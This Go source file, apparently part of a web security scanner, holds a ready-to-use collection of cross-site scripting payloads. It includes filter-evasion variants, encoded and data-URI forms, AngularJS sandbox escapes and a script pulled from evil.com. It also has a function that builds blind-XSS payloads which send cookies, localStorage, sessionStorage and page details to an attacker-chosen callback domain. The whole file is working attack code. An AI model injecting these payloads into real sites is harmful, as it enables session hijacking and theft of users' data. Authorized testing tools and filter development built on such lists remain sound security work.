package payloads

// XSSPayloads contains common XSS payloads
var XSSPayloads = []string{
	// Basic XSS vectors
	"<script>alert('XSS')</script>",
	"<img src=x onerror=alert('XSS')>",
	"<svg onload=alert('XSS')>",
	"<iframe src=\"javascript:alert('XSS')\"></iframe>",
	"<body onload=alert('XSS')>",
	"<input autofocus onfocus=alert('XSS')>",
	"<select autofocus onfocus=alert('XSS')>",
	"<textarea autofocus onfocus=alert('XSS')>",
	"<keygen autofocus onfocus=alert('XSS')>",
	"<video><source onerror=\"javascript:alert('XSS')\">",
	
	// HTML5 vectors
	"<audio src=x onerror=alert('XSS')>",
	"<video src=x onerror=alert('XSS')>",
	"<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert('XSS')\">CLICKME</maction>",
	"<form><button formaction=\"javascript:alert('XSS')\">CLICKME</button>",
	"<isindex type=image src=1 onerror=alert('XSS')>",
	"<object data=\"javascript:alert('XSS')\">",
	"<embed src=\"javascript:alert('XSS')\">",
	
	// Event handlers
	"<div onmouseover=\"alert('XSS')\">hover me</div>",
	"<div onclick=\"alert('XSS')\">click me</div>",
	"<body onscroll=alert('XSS')><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>",
	
	// Obfuscated payloads
	"<img src=\"javascript:alert('XSS');\">",
	"<img src=javascript:alert('XSS')>",
	"<img src=JaVaScRiPt:alert('XSS')>",
	"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
	"<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
	"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
	"<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
	"<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
	
	// Data URI schemes
	"<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
	"<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
	
	// Filter evasion
	"<script>alert(1)</script>",
	"<script>alert(document.cookie)</script>",
	"<ScRiPt>alert('XSS')</ScRiPt>",
	"<scr<script>ipt>alert('XSS')</scr</script>ipt>",
	"<<script>alert('XSS');//<</script>",
	"<script src=//evil.com/xss.js></script>",
	"<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>",
	"<img src=x:alert(alt) onerror=eval(src) alt='XSS'>",
	
	// AngularJS specific
	"{{constructor.constructor('alert(\"XSS\")')()}}",
	"<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
	"<x ng-app>{{constructor.constructor('alert(1)')()}}</x>",
	
	// DOM-based XSS
	"<script>document.write('<img src=x onerror=alert(1)>')</script>",
	"<script>document.write('<iframe src=\"javascript:alert(1)\">')</script>",
	
	// Advanced payloads
	"\"><script>alert(String.fromCharCode(88,83,83))</script>",
	"<svg><script>alert('XSS')</script></svg>",
	"<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
	"<svg><animate attributeName=x dur=1s onbegin=alert('XSS')>",
	"<svg><animate attributeName=x dur=1s onend=alert('XSS')>",
	"<svg><set attributeName=x dur=1s onbegin=alert('XSS')>",
	"<svg><set attributeName=x dur=1s onend=alert('XSS')>",
	"<svg><script>alert('XSS')</script></svg>",
	"<svg><style>{font-family:'<iframe/onload=alert(\"XSS\")'}</style>",
	
	// Exotic payloads
	"<marquee onstart=alert('XSS')>",
	"<div/onmouseover='alert(\"XSS\")'>X</div>",
	"<details open ontoggle=alert('XSS')>",
	"<iframe src=\"javascript:alert(`XSS`)\">",
}

// BlindXSSPayloads contains payloads for blind XSS testing
func BlindXSSPayloads(callbackDomain string) []string {
	return []string{
		// Fetch API based callbacks
		"<script>fetch('//" + callbackDomain + "/'+document.domain+'/'+document.cookie)</script>",
		"<script>fetch('//" + callbackDomain + "?d='+document.domain+'&c='+document.cookie+'&l='+location.href)</script>",
		"<script>fetch('//" + callbackDomain + "/blind?d='+btoa(document.domain))</script>",
		
		// SendBeacon based callbacks
		"<script>navigator.sendBeacon('//" + callbackDomain + "/beacon', JSON.stringify({domain:document.domain,cookie:document.cookie,url:location.href}))</script>",
		"<script>navigator.sendBeacon('//" + callbackDomain + "/beacon?d='+document.domain)</script>",
		
		// Image based callbacks (works in more restricted contexts)
		"<img src='//" + callbackDomain + "/img?d='+document.domain+'&t='+(new Date().getTime()) style='display:none'>",
		"<img src='//" + callbackDomain + "/'+document.domain style='display:none'>",
		
		// Script based callbacks
		"<script src='//" + callbackDomain + "/'+document.domain></script>",
		
		// XMLHttpRequest based callbacks
		"<script>var xhr=new XMLHttpRequest();xhr.open('GET','//" + callbackDomain + "/xhr?d='+document.domain+'&c='+encodeURIComponent(document.cookie),true);xhr.send();</script>",
		
		// WebSocket based callbacks
		"<script>var ws=new WebSocket('wss://" + callbackDomain + "');ws.onopen=function(){ws.send(document.domain+':'+document.cookie)};</script>",
		
		// Advanced callbacks with more information gathering
		"<script>fetch('//" + callbackDomain + "/detailed',{method:'POST',body:JSON.stringify({url:location.href,cookies:document.cookie,localStorage:JSON.stringify(localStorage),sessionStorage:JSON.stringify(sessionStorage),userAgent:navigator.userAgent,screenSize:screen.width+'x'+screen.height,languages:navigator.languages,platform:navigator.platform,time:new Date().toString(),referrer:document.referrer})})</script>",
	}
}
